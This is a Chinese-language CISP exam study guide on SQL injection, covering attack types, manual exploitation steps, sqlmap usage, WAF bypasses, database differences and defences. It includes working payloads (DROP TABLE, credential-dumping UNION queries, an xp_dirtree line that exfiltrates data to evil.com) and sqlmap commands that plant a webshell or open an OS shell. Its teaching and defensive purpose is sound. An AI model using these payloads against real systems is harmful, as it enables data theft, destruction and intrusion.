# SQL 注入挖掘实战

> **📘 文档定位**：CISP 考试渗透测试核心内容 | 难度：⭐⭐⭐⭐ | 预计阅读：22 分钟
> SQL 注入是最经典、危害最大的 Web 漏洞之一。本文从注入类型总览、手工挖掘流程、sqlmap 自动化到 WAF 绕过技巧，全面覆盖 SQL 注入攻防实战。

---

## 导航目录
- [一、SQL 注入类型总览](#一sql-注入类型总览)
- [二、手工挖掘流程](#二手工挖掘流程)
- [三、自动化工具: sqlmap](#三自动化工具-sqlmap)
- [四、常见 WAF 绕过技巧](#四常见-waf-绕过技巧)
- [五、各大数据库差异速查](#五各大数据库差异速查)
- [六、防御与修复](#六防御与修复)
- [七、实战靶场推荐](#七实战靶场推荐)
- [八、CheckList](#八checklist)
- [九、高分考点与知识巧记](#九高分考点与知识巧记)

---

## 一、SQL 注入类型总览

| 类型 | 说明 | 典型 Payload |
|------|------|-------------|
| **基于错误 (Error-based)** | 数据库错误消息泄漏数据 | `' AND 1=CONVERT(int, @@version)--` |
| **联合查询 (UNION-based)** | 追加 UNION SELECT 读取数据 | `' UNION SELECT 1,username,3 FROM users--` |
| **布尔盲注 (Boolean-based)** | 通过页面 true/false 差异一位一位猜 | `' AND ASCII(SUBSTRING((SELECT pass),1,1))>97--` |
| **时间盲注 (Time-based)** | 基于 SLEEP/BENCHMARK 延迟判断 | `'; IF(ASCII(SUBSTRING(pwd,1,1))>97) WAITFOR DELAY '0:0:5'--` |
| **堆叠查询 (Stacked queries)** | `;` 后执行第二条语句 | `'; DROP TABLE users--` |
| **Out-of-band (OOB)** | DNS/HTTP 请求带出数据 | `'; EXEC master..xp_dirtree '\\'+(SELECT pass)+'.evil.com\a'--` |
| **二阶注入 (Second-order)** | 第一次 payload 入库, 第二次查询触发 | 注册名 `admin'--`, 后续查询语句被注入 |
| **宽字节注入** | `%df%27` 吃掉转义符, 使 `addslashes` 失效 | `%df%27 OR 1=1--` (GBK 编码场景) |

## 二、手工挖掘流程

```
Step 1. 识别注入点:
  GET /article?id=1
  POST /login  body: user=admin&pass=xxx
  Cookie: sid=abc
  User-Agent / X-Forwarded-For (若被写进数据库)

Step 2. 注入测试:
  ?id=1'             → 语法错误 (单引号触发)
  ?id=1''            → 两个单引号闭合, 页面正常 → 存在注入
  ?id=1' and '1'='1  → true  状态
  ?id=1' and '1'='2  → false 状态 → 确认为 boolean 盲注

Step 3. 判断数据库类型 (MySQL / MSSQL / Oracle / PostgreSQL / SQLite):
  ?id=1 and 1=1            MySQL/PG/SQLite (SQL Server 也可)
  ?id=1' and 'a'+'b'='ab   MySQL/PG
  ?id=1' and 'a'||'b'='ab  Oracle
  ?id=1 WAITFOR DELAY '0:0:2'  → SQL Server
  ?id=1; WAITFOR DELAY ...     → SQL Server 支持堆叠
  ?id=1' and sleep(2)--        → MySQL
  ?id=1; SELECT pg_sleep(2)--  → PostgreSQL

Step 4. UNION 注入获取数据:
  # 猜列数 (ORDER BY 法)
  ?id=1' ORDER BY 10--   → 错误
  ?id=1' ORDER BY 5--    → 正确
  # 逐步收敛列数 (3~10)

  # 确定可输出列位置
  ?id=1' UNION SELECT 1,2,3,4,5--
  # 观察页面哪个数字被替换, 即输出列

  # 获取基本信息
  ?id=1' UNION SELECT 1,@@version,3,current_user(),database()--

  # 读取表 (MySQL information_schema)
  ?id=1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

  # 读取列
  ?id=1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

  # 读取账号密码
  ?id=1' UNION SELECT 1,concat(username,0x3a,password),3 FROM users--

Step 5. 盲注 (无回显时):
  # 布尔盲注: 借助 真/假 页面长度差异, 二分法猜字符
  # 时间盲注: 借助 sleep(N) 判断条件真假
  # OOB: DNSlog / HTTPLog 带出数据 (Burp Collaborator / ceye.io)
```

## 三、自动化工具: sqlmap

```bash
# 1. 简单 GET 注入
sqlmap -u "http://target.com/article?id=1" --batch

# 2. POST 表单
sqlmap -u "http://target.com/login" --data="user=admin&pass=xxx" --batch

# 3. Header / Cookie 注入
sqlmap -u "http://target.com/" --cookie "sid=abc" -p sid --batch
sqlmap -u "http://target.com/" --headers="X-Forwarded-For: 127.0.0.1*"

# 4. 指定数据库类型 (已知时提速)
sqlmap -u "http://target.com/article?id=1" --dbms=MySQL --batch

# 5. 列出所有数据库
sqlmap -u "http://target.com/article?id=1" --dbs --batch

# 6. 列出表 + 列 + dump 数据
sqlmap -u "..." -D targetdb --tables
sqlmap -u "..." -D targetdb -T users --columns
sqlmap -u "..." -D targetdb -T users --dump

# 7. 读取/写入文件 (需 FILE privilege)
sqlmap -u "..." --file-read "C:\\Windows\\System32\\drivers\\etc\\hosts"
sqlmap -u "..." --file-write /local/shell.php --file-dest "C:\\inetpub\\wwwroot\\shell.php"

# 8. OS Shell (需高权限)
sqlmap -u "..." --os-shell

# 9. Request File (Burp 保存请求为 1.txt, 用 -r 加载)
sqlmap -r 1.txt -p id --batch

# 10. Tamper 脚本 (绕过 WAF)
sqlmap -u "..." --tamper=space2comment,apostrophemask,base64encode --batch
```

## 四、常见 WAF 绕过技巧

| 场景 | 技巧 |
|------|------|
| 关键字过滤 (select/union) | `SeLecT` 大小写 / `/*!50000select*/` (MySQL 内联注释) / `%09%0A%0D` 替代空格 / `%23` 注释符 |
| 空格过滤 | `/**/` / `%09` (TAB) / `%0A` (LF) / `%00` (NUL) / `+` / 括号嵌套 `UNION(SELECT ...)` |
| 引号过滤 (单引号被转义) | `%df%27` (宽字节) / `CHAR(0x61,0x64,0x6d,0x69,0x6e)` / 十六进制 `0x61646d696e` |
| `and/or` 过滤 | `&&` / `||` / `1 between 1 and 1` / `2 in (1,2,3)` / `@` 变量 |
| `=` 过滤 | `like` / `rlike` / `regexp` / `<>` 的反向 / `strcmp(str, str)=0` |
| `sleep` 过滤 | `benchmark(10000000,md5(1))` / `pg_sleep(2)` / `WAITFOR DELAY` |
| `information_schema` 过滤 | MySQL 5.7+ 可用 `sys.schema_auto_increment_columns` / `sys.schema_table_statistics` |
| 字节编码 / chunked | HTTP Transfer-Encoding: chunked 分段请求, 绕过 WAF 解析 |
| HTTP 参数污染 (HPP) | `?id=1&id=2 UNION SELECT...`, 部分后端取最后一个参数 |

## 五、各大数据库差异速查

| 需求 | MySQL | MSSQL | Oracle | PostgreSQL | SQLite |
|------|-------|--------|--------|-----------|--------|
| 注释符 | `#` / `-- ` / `/* */` | `-- ` / `/* */` | `-- ` / `/* */` | `-- ` / `/* */` | `-- ` / `/* */` |
| 字符串连接 | `CONCAT(a,b)` / `a+b` (部分) | `a+b` | `a\|│b` | `a\|│b` | `a\|│b` |
| 延时函数 | `sleep(N)` | `WAITFOR DELAY 'HH:MM:SS'` | `DBMS_LOCK.SLEEP(N)` | `pg_sleep(N)` | 需用 heavy query |
| 版本信息 | `@@version` / `version()` | `@@version` | `v$version` | `version()` | `sqlite_version()` |
| 当前用户 | `current_user()` / `user()` | `suser_sname()` | `user` | `current_user` | 无 |
| 表/列枚举 | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` | `sqlite_master` |
| DNS OOB | `LOAD_FILE('\\\\dns\\a')` (Windows) / `select ... into outfile` | `master..xp_dirtree` | `UTL_HTTP.REQUEST` | `COPY (SELECT ...) TO PROGRAM 'nslookup ...'` | 受限 |

## 六、防御与修复

```python
# ✅ 参数化查询 (首选)
cursor.execute("SELECT * FROM users WHERE name = %s", (user,))    # Python/psycopg2

# ✅ ORM (避免手写 SQL)
User.objects.filter(name=request.form.get("name"))                # Django

# ✅ 白名单 (动态表名/列名/排序字段无法参数化, 必须白名单)
allowed_cols = {"name", "created_at", "score"}
col = request.args.get("sort") if request.args.get("sort") in allowed_cols else "name"

# ✅ 最小权限: 业务账号只能 SELECT / INSERT / UPDATE 目标表
#    禁止业务账号拥有 FILE / SUPER / MSSQL xp_cmdshell 权限

# ✅ WAF / 数据库审计 / 云数据库防火墙
#    但不要仅依赖 WAF (参考本文件 第五节)

# ❌ 以下"伪安全"做法不靠谱
#    - 只做前端正则替换
#    - 仅使用 addslashes / magic_quotes (已废弃)
#    - 仅 "blacklist = ['drop', 'select', ...]" (可绕过)
```

## 七、实战靶场推荐

| 平台 | 说明 |
|------|------|
| **DVWA** | 最经典的 PHP 练习环境, 难度分级 |
| **sqli-labs** | 专注 SQL 注入, 80+ 关覆盖各类场景 |
| **pikachu** | 国产, 中文友好, 含 SQL/XSS/CSRF 等 |
| **PortSwigger SQLi Labs** | Burp Academy, 覆盖 blind/second-order |
| **HackTheBox / TryHackMe** | 实战机, 含真实环境注入 |

## 八、CheckList

- [ ] 所有数据库查询使用参数化 (ORM 优先, 原生 SQL 必须 bind params)
- [ ] 动态查询部分 (排序/列名/表名) 做白名单映射
- [ ] 数据库账号最小权限: 禁止 FILE/SUPER/xp_cmdshell/写文件权限
- [ ] 业务账号区分 read / write / admin 三档
- [ ] 敏感数据列 (password / token) 加密/哈希存储, 不能以明文 dump
- [ ] WAF/CDN 做基础防护, 但不依赖其完全阻断
- [ ] 数据库审计日志记录高危语句 (DROP / TRUNCATE / UNION / INTO OUTFILE)
- [ ] 数据库开启错误消息隐藏, 生产环境不把堆栈打到前端
- [ ] 每季度至少一次外部渗透测试 + sqlmap 全量扫描
- [ ] 开发培训: 禁止 SQL 字符串拼接, 使用 ORM + 参数化

---

## 九、高分考点与知识巧记

> 🔑 **高分考点**：SQL 注入是 CISP 考试必考内容。注入类型辨析、手工挖掘流程、五大数据库差异、防御方案对比是四大核心考点。考试常出场景题——"某页面 id 参数存在注入，但无回显，如何利用？"

| 考点 | 频次 | 核心记忆点 |
|:---|:---:|:---|
| 注入类型分类 | ⭐⭐⭐⭐⭐ | 报错/联合/布尔盲注/时间盲注/堆叠/OOB/二阶/宽字节 |
| 手工挖掘流程 | ⭐⭐⭐⭐ | 找注入点 → 测闭合 → 判类型 → 猜列数 → UNION 读数据 → 盲注兜底 |
| 数据库差异 | ⭐⭐⭐⭐ | MySQL(sleep/version)、MSSQL(WAITFOR/@@version)、Oracle(DBMS_LOCK/dual) |
| WAF 绕过 | ⭐⭐⭐⭐ | 大小写/内联注释/编码/宽字节/HPP/chunked |
| 防御方案 | ⭐⭐⭐⭐ | 参数化查询(首选) > ORM > 白名单 > WAF > 最小权限 |

> 💡 **知识巧记**：注入八类型记"报联布时堆 O 二阶宽"——报错、联合、布尔、时间、堆叠、OOB、二阶、宽字节。手工五步记"找闭判猜读"——找注入点、测试闭合、判断类型、猜列数、读数据。五库差异关键：MySQL sleep、MSSQL WAITFOR、Oracle DBMS_LOCK、PG pg_sleep、SQLite 无延时。

### 高分考点速查表

| 考察维度 | 关键结论 | 常见干扰项 |
|:---|:---|:---|
| 参数化查询 | 首选防御方案，彻底分离代码与数据 | "ORM 一定防注入" ❌ |
| 布尔 vs 时间盲注 | 布尔用页面差异，时间用延时判断 | "时间盲注比布尔盲注快" ❌ |
| ORDER BY 猜列 | 二分法逐步收敛 | "ORDER BY 只能用在 MySQL" ❌ |
| information_schema | MySQL 5.7+ 可用 sys schema 替代 | "information_schema 被禁就无法枚举" ❌ |
| addslashes | 可被宽字节绕过，已废弃 | "addslashes 足够安全" ❌ |

### 知识巧记口诀

> **SQL 注入攻防口诀**：
> 注入八类报联布时堆 O 二阶宽，手工五步找闭判猜读。
> MySQL sleep 延，MSSQL WAITFOR 判，Oracle DBMS_LOCK 慢。
> 绕过手法大小写混注释藏，编码宽字节 chunked 分段传。
> 防御首选参数化，ORM 白名单 WAF 权限最小化。
